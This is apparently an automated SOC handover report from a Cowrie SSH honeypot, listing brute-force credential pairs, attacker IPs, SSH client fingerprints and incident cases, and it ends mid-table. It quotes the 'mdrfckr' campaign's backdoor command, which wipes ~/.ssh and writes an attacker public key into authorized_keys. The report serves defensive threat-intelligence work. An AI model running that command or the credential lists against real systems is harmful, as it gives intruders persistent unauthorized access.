# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-03 |
| **Generated At** | 2026-07-03T07:25:55Z |
| **Shift Time** | 07:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **190** |
| Confirmed Threats | **175** |
| False Positives Filtered | **15** (7.9%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **20** |
| High Severity Cases | **113** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **77** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **160** |
| Unique Credential Pairs | **90** |
| Unique Usernames | **30** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **129** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 68 |
| `345gs5662d34` | 34 |
| `admin` | 9 |
| `ubuntu` | 3 |
| `support` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 34 |
| `3245gs5662d34` | 32 |
| `admin` | 7 |
| `123456` | 5 |
| `LeitboGi0ro` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 34 |
| `root` | `3245gs5662d34` | 14 |
| `admin` | `admin` | 7 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `123@@@` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Oracle@123456` | `45.198.224.120` | 2026-07-03T03:01:12 |
| `root` | `pedro123` | `10.0.0.73` | 2026-07-03T03:07:24 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-03T03:07:28 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T03:07:29 |
| `root` | `123asd` | `10.0.0.73` | 2026-07-03T03:08:02 |
| `root` | `6655321` | `185.242.3.195` | 2026-07-03T03:08:44 |
| `root` | `baxter` | `10.0.0.73` | 2026-07-03T03:10:45 |
| `spam` | `spam` | `34.81.72.185` | 2026-07-03T03:10:59 |
| `345gs5662d34` | `345gs5662d34` | `34.81.72.185` | 2026-07-03T03:11:03 |
| `spam` | `3245gs5662d34` | `34.81.72.185` | 2026-07-03T03:11:04 |
| `root` | `qqqq123` | `10.0.0.73` | 2026-07-03T03:11:52 |
| `root` | `P455wOrd` | `45.198.224.120` | 2026-07-03T03:12:34 |
| `root` | `zxc1230.` | `10.0.0.73` | 2026-07-03T03:15:28 |
| `root` | `Hb123456` | `10.0.0.73` | 2026-07-03T03:22:59 |
| `root` | `king` | `10.0.0.73` | 2026-07-03T03:23:41 |
| `root` | `P455WORD` | `45.198.224.120` | 2026-07-03T03:24:25 |
| `root` | `fuckyou` | `45.198.224.120` | 2026-07-03T03:36:35 |
| `kupon` | `123456` | `10.0.0.73` | 2026-07-03T03:41:32 |
| `kupon` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T03:41:38 |
| `victoria` | `victoria` | `10.0.0.73` | 2026-07-03T03:42:27 |
| `victoria` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T03:42:32 |
| `root` | `Qwer!234` | `45.198.224.120` | 2026-07-03T03:48:56 |
| `root` | `6655321` | `10.0.0.73` | 2026-07-03T03:49:01 |
| `ubuntu` | `ubuntu` | `134.122.102.174` | 2026-07-03T03:59:52 |
| `ubuntu` | `abcd` | `45.198.224.120` | 2026-07-03T04:00:44 |
| `solana` | `solana` | `134.122.102.174` | 2026-07-03T04:03:00 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-03T04:04:49 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-03T04:04:49 |
| `sol` | `sol` | `134.122.102.174` | 2026-07-03T04:06:04 |
| `solv` | `solv` | `134.122.102.174` | 2026-07-03T04:09:00 |
| `newuser` | `12345678` | `115.190.203.239` | 2026-07-03T04:09:59 |
| `345gs5662d34` | `345gs5662d34` | `115.190.203.239` | 2026-07-03T04:10:04 |
| `newuser` | `3245gs5662d34` | `115.190.203.239` | 2026-07-03T04:10:05 |
| `user` | `solana` | `134.122.102.174` | 2026-07-03T04:11:49 |
| `root` | `qwe!@#qwe` | `45.198.224.120` | 2026-07-03T04:12:14 |
| `root` | `!Welcome` | `124.193.81.23` | 2026-07-03T04:14:18 |
| `root` | `c@123456` | `58.186.20.143` | 2026-07-03T04:14:35 |
| `345gs5662d34` | `345gs5662d34` | `124.193.81.23` | 2026-07-03T04:14:35 |
| `345gs5662d34` | `345gs5662d34` | `58.186.20.143` | 2026-07-03T04:14:39 |
| `root` | `3245gs5662d34` | `58.186.20.143` | 2026-07-03T04:14:41 |
| `root` | `1q2w3e4r%` | `138.99.80.102` | 2026-07-03T04:19:06 |
| `345gs5662d34` | `345gs5662d34` | `138.99.80.102` | 2026-07-03T04:19:09 |
| `root` | `3245gs5662d34` | `138.99.80.102` | 2026-07-03T04:19:10 |
| `root` | `Password99` | `45.198.224.120` | 2026-07-03T04:23:38 |
| `support` | `support` | `176.53.159.196` | 2026-07-03T04:28:07 |
| `admin` | `123` | `101.53.236.155` | 2026-07-03T04:31:27 |
| `345gs5662d34` | `345gs5662d34` | `101.53.236.155` | 2026-07-03T04:31:31 |
| `admin` | `3245gs5662d34` | `101.53.236.155` | 2026-07-03T04:31:32 |
| `admin` | `admin` | `138.252.175.34` | 2026-07-03T04:33:13 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-03T04:33:14 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-03T04:34:28 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-03T04:34:28 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-03T04:34:36 |
| `root` | `1` | `45.198.224.120` | 2026-07-03T04:35:07 |
| `root` | `qmailp` | `185.242.3.195` | 2026-07-03T04:40:10 |
| `user2` | `user2` | `45.198.224.120` | 2026-07-03T04:46:37 |
| `root` | `r` | `45.198.224.120` | 2026-07-03T04:58:09 |
| `root` | `city` | `122.35.192.33` | 2026-07-03T05:06:39 |
| `345gs5662d34` | `345gs5662d34` | `122.35.192.33` | 2026-07-03T05:06:43 |
| `root` | `3245gs5662d34` | `122.35.192.33` | 2026-07-03T05:06:44 |
| `deployer` | `changeme` | `194.107.115.199` | 2026-07-03T05:08:46 |
| `345gs5662d34` | `345gs5662d34` | `194.107.115.199` | 2026-07-03T05:09:15 |
| `deployer` | `3245gs5662d34` | `194.107.115.199` | 2026-07-03T05:09:16 |
| `ubuntu` | `1234567` | `45.198.224.120` | 2026-07-03T05:09:47 |
| `deployer` | `changeme` | `220.154.143.136` | 2026-07-03T05:12:45 |
| `admin` | `admin` | `193.202.11.83` | 2026-07-03T05:14:01 |
| `esuser` | `admin123` | `36.64.131.68` | 2026-07-03T05:17:17 |
| `345gs5662d34` | `345gs5662d34` | `36.64.131.68` | 2026-07-03T05:17:22 |
| `esuser` | `3245gs5662d34` | `36.64.131.68` | 2026-07-03T05:17:23 |
| `root` | `qmailp` | `10.0.0.73` | 2026-07-03T05:20:28 |
| `root` | `banned` | `45.198.224.120` | 2026-07-03T05:21:14 |
| `root` | `kitroot` | `45.198.224.120` | 2026-07-03T05:32:34 |
| `ibc` | `ibc123` | `10.0.0.73` | 2026-07-03T05:37:45 |
| `ibc` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:37:48 |
| `kaluga` | `123456` | `10.0.0.73` | 2026-07-03T05:38:28 |
| `kaluga` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:38:34 |
| `gateway` | `gateway123` | `10.0.0.73` | 2026-07-03T05:38:52 |
| `gateway` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:38:54 |
| `radio2` | `radio2` | `10.0.0.73` | 2026-07-03T05:38:56 |
| `radio2` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:39:03 |
| `emma` | `emma123` | `10.0.0.73` | 2026-07-03T05:41:06 |
| `emma` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:41:12 |
| `cia` | `123456` | `10.0.0.73` | 2026-07-03T05:41:31 |
| `cia` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T05:41:35 |
| `root` | `t5r4e3w2q1` | `45.198.224.120` | 2026-07-03T05:44:03 |
| `crmdev` | `crmdev` | `182.71.135.110` | 2026-07-03T05:46:38 |
| `345gs5662d34` | `345gs5662d34` | `182.71.135.110` | 2026-07-03T05:46:43 |
| `crmdev` | `3245gs5662d34` | `182.71.135.110` | 2026-07-03T05:46:45 |
| `framework` | `framework` | `78.39.48.166` | 2026-07-03T05:50:22 |
| `345gs5662d34` | `345gs5662d34` | `78.39.48.166` | 2026-07-03T05:50:25 |
| `framework` | `3245gs5662d34` | `78.39.48.166` | 2026-07-03T05:50:26 |
| `cx` | `cx` | `160.22.170.237` | 2026-07-03T05:51:58 |
| `345gs5662d34` | `345gs5662d34` | `160.22.170.237` | 2026-07-03T05:52:03 |
| `cx` | `3245gs5662d34` | `160.22.170.237` | 2026-07-03T05:52:05 |
| `yangliusha11` | `yangliusha11` | `45.198.224.120` | 2026-07-03T05:55:24 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-03T06:01:26 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-03T06:01:27 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-03T06:01:32 |
| `root` | `1234567890` | `45.198.224.120` | 2026-07-03T06:06:57 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.95` | 2026-07-03T06:07:03 |
| `root` | `trsadmin` | `10.0.0.73` | 2026-07-03T06:08:38 |
| `root` | `1qwe23` | `185.242.3.195` | 2026-07-03T06:11:39 |
| `root` | `loveme` | `45.198.224.120` | 2026-07-03T06:18:02 |
| `root` | `hello!@#456` | `103.182.132.154` | 2026-07-03T06:20:10 |
| `345gs5662d34` | `345gs5662d34` | `103.182.132.154` | 2026-07-03T06:20:14 |
| `root` | `3245gs5662d34` | `103.182.132.154` | 2026-07-03T06:20:16 |
| `root` | `root123qwe` | `213.176.16.218` | 2026-07-03T06:23:49 |
| `345gs5662d34` | `345gs5662d34` | `213.176.16.218` | 2026-07-03T06:23:55 |
| `root` | `3245gs5662d34` | `213.176.16.218` | 2026-07-03T06:23:56 |
| `root` | `Wntlrghltkzhzha.,` | `103.189.234.244` | 2026-07-03T06:24:58 |
| `345gs5662d34` | `345gs5662d34` | `103.189.234.244` | 2026-07-03T06:25:04 |
| `root` | `3245gs5662d34` | `103.189.234.244` | 2026-07-03T06:25:06 |
| `root` | `123456ty` | `95.165.77.31` | 2026-07-03T06:27:29 |
| `345gs5662d34` | `345gs5662d34` | `95.165.77.31` | 2026-07-03T06:27:31 |
| `root` | `3245gs5662d34` | `95.165.77.31` | 2026-07-03T06:27:32 |
| `root` | `bonjour` | `45.198.224.120` | 2026-07-03T06:29:06 |
| `root` | `Pf123456` | `178.185.136.57` | 2026-07-03T06:29:14 |
| `345gs5662d34` | `345gs5662d34` | `178.185.136.57` | 2026-07-03T06:29:17 |
| `root` | `3245gs5662d34` | `178.185.136.57` | 2026-07-03T06:29:18 |
| `cake` | `123456` | `178.128.1.119` | 2026-07-03T06:31:20 |
| `345gs5662d34` | `345gs5662d34` | `178.128.1.119` | 2026-07-03T06:31:22 |
| `cake` | `3245gs5662d34` | `178.128.1.119` | 2026-07-03T06:31:23 |
| `olimp` | `123456` | `125.31.2.160` | 2026-07-03T06:35:23 |
| `345gs5662d34` | `345gs5662d34` | `125.31.2.160` | 2026-07-03T06:35:27 |
| `olimp` | `3245gs5662d34` | `125.31.2.160` | 2026-07-03T06:35:28 |
| `fernando` | `fernando` | `45.198.224.120` | 2026-07-03T06:40:31 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-03T06:44:06 |
| `root` | `Pass@1234` | `45.198.224.120` | 2026-07-03T06:51:43 |
| `root` | `1qwe23` | `10.0.0.73` | 2026-07-03T06:51:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **190** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 77 |
| Go SSH scanner | 43 |
| Paramiko (Python) | 12 |
| OpenSSH | 7 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 52 | 20 |
| `16443846184e...` | Generic scanner | 34 | 5 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `03a80b21afa8...` | Modern SSH client | 6 | 2 |
| `a984ff804585...` | libssh-based | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 52 | 20 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 34 | 5 | Generic scanner |
| `95420f9d932d...` | libssh | 14 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 17 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.31.2.160`, `58.186.20.143`, `34.81.72.185`, `36.64.131.68`, `182.71.135.110`, `160.22.170.237`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **43** |
| High-Risk ASNs | **41** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS25369` | Hydra Communications Ltd | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS215540` | GLOBAL CONNECTIVITY SOLUTIONS LLP | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (112)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b09c356e2cec

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 03:01 |
| **Last Seen** | 2026-07-03 03:01 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:01:04` | `cowrie.session.connect` |
| `2026-07-03 03:01:05` | `cowrie.client.version` |
| `2026-07-03 03:01:05` | `cowrie.client.kex` |
| `2026-07-03 03:01:12` | `cowrie.login.success` |
| `2026-07-03 03:01:16` | `cowrie.session.params` |
| `2026-07-03 03:01:16` | `cowrie.command.input` |
| `2026-07-03 03:01:18` | `cowrie.log.closed` |
| `2026-07-03 03:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c567e59f0cb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 03:08 |
| **Last Seen** | 2026-07-03 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:08:44` | `cowrie.session.connect` |
| `2026-07-03 03:08:44` | `cowrie.client.version` |
| `2026-07-03 03:08:44` | `cowrie.client.kex` |
| `2026-07-03 03:08:44` | `cowrie.login.success` |
| `2026-07-03 03:08:45` | `cowrie.session.params` |
| `2026-07-03 03:08:45` | `cowrie.command.input` |
| `2026-07-03 03:08:45` | `cowrie.log.closed` |
| `2026-07-03 03:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149054333721

| Field | Detail |
|---|---|
| **Source IP** | `34.81.72[.]185` |
| **First Seen** | 2026-07-03 03:10 |
| **Last Seen** | 2026-07-03 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:10:58` | `cowrie.session.connect` |
| `2026-07-03 03:10:58` | `cowrie.client.version` |
| `2026-07-03 03:10:58` | `cowrie.client.kex` |
| `2026-07-03 03:10:59` | `cowrie.login.success` |
| `2026-07-03 03:11:00` | `cowrie.session.params` |
| `2026-07-03 03:11:00` | `cowrie.command.input` |
| `2026-07-03 03:11:00` | `cowrie.command.failed` |
| `2026-07-03 03:11:00` | `cowrie.log.closed` |
| `2026-07-03 03:11:01` | `cowrie.session.params` |
| `2026-07-03 03:11:01` | `cowrie.command.input` |
| `2026-07-03 03:11:01` | `cowrie.session.file_download` |
| `2026-07-03 03:11:01` | `cowrie.log.closed` |
| `2026-07-03 03:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.81.72[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.81.72[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46942b3f599

| Field | Detail |
|---|---|
| **Source IP** | `34.81.72[.]185` |
| **First Seen** | 2026-07-03 03:11 |
| **Last Seen** | 2026-07-03 03:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:11:02` | `cowrie.session.connect` |
| `2026-07-03 03:11:02` | `cowrie.client.version` |
| `2026-07-03 03:11:02` | `cowrie.client.kex` |
| `2026-07-03 03:11:03` | `cowrie.login.success` |
| `2026-07-03 03:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.81.72[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.81.72[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba27a5b814c

| Field | Detail |
|---|---|
| **Source IP** | `34.81.72[.]185` |
| **First Seen** | 2026-07-03 03:11 |
| **Last Seen** | 2026-07-03 03:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:11:03` | `cowrie.session.connect` |
| `2026-07-03 03:11:03` | `cowrie.client.version` |
| `2026-07-03 03:11:03` | `cowrie.client.kex` |
| `2026-07-03 03:11:04` | `cowrie.login.success` |
| `2026-07-03 03:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.81.72[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.81.72[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a26fa9547d2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 03:12 |
| **Last Seen** | 2026-07-03 03:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:12:27` | `cowrie.session.connect` |
| `2026-07-03 03:12:28` | `cowrie.client.version` |
| `2026-07-03 03:12:28` | `cowrie.client.kex` |
| `2026-07-03 03:12:34` | `cowrie.login.success` |
| `2026-07-03 03:12:38` | `cowrie.session.params` |
| `2026-07-03 03:12:38` | `cowrie.command.input` |
| `2026-07-03 03:12:39` | `cowrie.log.closed` |
| `2026-07-03 03:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68463fb73303

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 03:24 |
| **Last Seen** | 2026-07-03 03:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:24:16` | `cowrie.session.connect` |
| `2026-07-03 03:24:19` | `cowrie.client.version` |
| `2026-07-03 03:24:19` | `cowrie.client.kex` |
| `2026-07-03 03:24:25` | `cowrie.login.success` |
| `2026-07-03 03:24:30` | `cowrie.session.params` |
| `2026-07-03 03:24:30` | `cowrie.command.input` |
| `2026-07-03 03:24:31` | `cowrie.log.closed` |
| `2026-07-03 03:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a284db6436

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 03:36 |
| **Last Seen** | 2026-07-03 03:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:36:27` | `cowrie.session.connect` |
| `2026-07-03 03:36:28` | `cowrie.client.version` |
| `2026-07-03 03:36:28` | `cowrie.client.kex` |
| `2026-07-03 03:36:35` | `cowrie.login.success` |
| `2026-07-03 03:36:36` | `cowrie.session.params` |
| `2026-07-03 03:36:36` | `cowrie.command.input` |
| `2026-07-03 03:36:37` | `cowrie.log.closed` |
| `2026-07-03 03:36:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f600d1e9963a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 03:45 |
| **Last Seen** | 2026-07-03 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:45:18` | `cowrie.session.connect` |
| `2026-07-03 03:45:18` | `cowrie.client.version` |
| `2026-07-03 03:45:18` | `cowrie.client.kex` |
| `2026-07-03 03:45:19` | `cowrie.login.success` |
| `2026-07-03 03:45:19` | `cowrie.session.params` |
| `2026-07-03 03:45:19` | `cowrie.command.input` |
| `2026-07-03 03:45:19` | `cowrie.log.closed` |
| `2026-07-03 03:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d55fcad4ad9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 03:48 |
| **Last Seen** | 2026-07-03 03:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:48:48` | `cowrie.session.connect` |
| `2026-07-03 03:48:49` | `cowrie.client.version` |
| `2026-07-03 03:48:49` | `cowrie.client.kex` |
| `2026-07-03 03:48:56` | `cowrie.login.success` |
| `2026-07-03 03:49:00` | `cowrie.session.params` |
| `2026-07-03 03:49:00` | `cowrie.command.input` |
| `2026-07-03 03:49:01` | `cowrie.log.closed` |
| `2026-07-03 03:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05cf60e803f2

| Field | Detail |
|---|---|
| **Source IP** | `134.122.102[.]174` |
| **First Seen** | 2026-07-03 03:59 |
| **Last Seen** | 2026-07-03 03:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 03:59:51` | `cowrie.session.connect` |
| `2026-07-03 03:59:51` | `cowrie.client.version` |
| `2026-07-03 03:59:51` | `cowrie.client.kex` |
| `2026-07-03 03:59:52` | `cowrie.login.success` |
| `2026-07-03 03:59:54` | `cowrie.session.params` |
| `2026-07-03 03:59:54` | `cowrie.command.input` |
| `2026-07-03 03:59:54` | `cowrie.log.closed` |
| `2026-07-03 03:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.102[.]174` to AbuseIPDB if not already reported
- [ ] Block `134.122.102[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8aff5e0200

| Field | Detail |
